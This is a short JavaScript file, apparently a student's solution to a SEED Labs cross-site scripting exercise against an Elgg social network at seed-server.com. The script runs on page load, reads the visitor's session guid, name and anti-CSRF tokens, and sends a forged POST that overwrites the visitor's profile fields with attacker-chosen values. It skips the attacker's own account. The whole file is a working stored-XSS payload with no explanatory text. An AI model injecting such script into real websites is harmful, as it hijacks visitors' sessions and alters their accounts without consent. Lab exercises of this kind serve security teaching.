//<script type="text/javascript">

function generateRandomString(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

window.onload = function(){
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

//Construct the content of your url.
var sendurl="http://www.seed-server.com/action/profile/edit";

var guid="&guid="+elgg.session.user.guid; 
var name="&name="+elgg.session.user.name 
var description = "&description=1905114" + " &accesslevel[description]=1" 
var briefdescription = "&briefdescription="+generateRandomString(10)+ " &accesslevel[briefdescription]=1"
var location = "&location="+generateRandomString(10)+" &accesslevel[location]=1"
var interests = "&interests="+generateRandomString(10)+" &accesslevel[interests]=1"
var skills = "&skills="+generateRandomString(10)+" &accesslevel[skills]=1"
var contactemail = "&contactemail=samy@gmail.com" + " &accesslevel[contactemail]=1"
var phone = "&phone=12345" + " &accesslevel[phone]=1"
var mobile = "&mobile=12345" + " &accesslevel[mobile]=1"
var website = "&website=http://www.abc.com" + " &accesslevel[website]=1"
var twitter = "&twitter="+generateRandomString(10) + " &accesslevel[twitter]=1"

var content=token+ts+name+description+briefdescription+location+interests+skills+phone+mobile+website+twitter+guid; 

if(elgg.session.user.guid!=59)
{
    //Create and send Ajax request to modify profile
    var Ajax=null;
    Ajax=new XMLHttpRequest();
    Ajax.open("POST",sendurl,true);
    //Ajax.setRequestHeader("Host","www.seed-server.com");
    Ajax.setRequestHeader("Content-Type",
    "application/x-www-form-urlencoded");
    Ajax.send(content);
}
}
//</script>